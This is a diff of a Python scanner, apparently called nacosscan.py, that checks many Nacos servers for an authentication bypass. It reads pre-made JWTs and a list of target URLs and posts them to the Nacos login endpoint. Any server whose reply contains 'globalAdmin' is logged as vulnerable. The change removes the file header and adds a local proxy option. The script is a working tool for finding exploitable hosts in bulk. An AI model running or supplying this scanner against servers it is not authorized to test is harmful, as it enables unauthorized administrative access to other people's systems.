@@ -1,11 +1,3 @@
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
-# @Time    : 2023/5/6 18:44
-# @Author  : Lyang
-# @FileName: nacosscan.py
-# @Software: PyCharm
-# @version 2.0
-
 import requests
 from urllib.parse import urlparse
 
@@ -14,6 +6,14 @@ with open('JWT.txt') as f:
 
 with open('url.txt') as f:
     urls = f.read().strip().split('\n')
+
+# 添加是否使用代理和代理端口的选项
+use_proxy = input("是否使用代理？(y/n): ")
+if use_proxy.lower() == "y":
+    proxy_port = input("请输入代理端口号：")
+    proxies = {"http": f"http://127.0.0.1:{proxy_port}", "https": f"http://127.0.0.1:{proxy_port}"}
+else:
+    proxies = {}
 
 for url in urls:
     # 处理url
@@ -39,7 +39,7 @@ for url in urls:
     # 验证是否存在漏洞
     try:
         # 尝试以https协议进行请求
-        response = requests.post(login_url, headers=headers, data=params, timeout=3, verify=False)
+        response = requests.post(login_url, headers=headers, data=params, timeout=3, verify=False, proxies=proxies)
         if response.status_code == 200 and 'globalAdmin' in response.text:
             print(f'存在漏洞: {url}')
             with open("output.txt", "a") as f:
@@ -48,7 +48,7 @@ for url in urls:
             # 尝试以http协议进行请求
             http_url = url.replace('https', 'http')
             login_url = f"{http_url}/nacos/v1/auth/users/login"
-            response = requests.post(login_url, headers=headers, data=params, timeout=3, verify=False)
+            response = requests.post(login_url, headers=headers, data=params, timeout=3, verify=False, proxies=proxies)
             if response.status_code == 200 and 'globalAdmin' in response.text:
                 print(f'存在漏洞: {url}')
                 with open("output.txt", "a") as f:
